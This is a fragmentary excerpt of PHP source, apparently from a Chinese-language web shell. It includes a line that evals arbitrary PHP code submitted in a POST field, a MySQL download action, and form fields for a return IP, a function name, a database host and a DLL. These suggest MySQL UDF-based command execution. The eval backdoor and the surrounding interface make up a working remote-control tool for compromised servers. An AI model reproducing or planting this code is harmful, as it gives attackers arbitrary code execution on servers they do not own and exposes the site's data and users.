...
if(isset($_POST['phpcode'])){eval("?".">$_POST[phpcode]<?php");exit;
}
if($action=="mysqldown"){
...
<table width="760" border="0" cellpadding="3" cellspacing="1"
    ...
    <tr class="secondalt">
        ...
        返回IP: <input name="ip" type="text" class="INPUT"
            value="<?php echo$_SERVER['REMOTE_ADDR']?>"> function名: <input
        ...
        Host : <input name="host" type="text" class="INPUT" value="localhost"
            ...
            <?php echo$echodll?> <?php echo"<input name=\"nodll\" value=\"".$nodll."\" type=\"hidden\">";?>
        </td>
    </tr>
    <tr class="secondalt">
...
<table width="760" border="0" cellpadding="3" cellspacing="1"
    ...
    <tr class="secondalt">
        ...
        - <a href="#" title="使用说明" onClick="alert('回到执行命令处')">(?)</a> <input
            name="job" type="hidden" value="<?php echo$job?>"> <?php
      }
      ?></td>
    </tr>
    <tr class="secondalt">
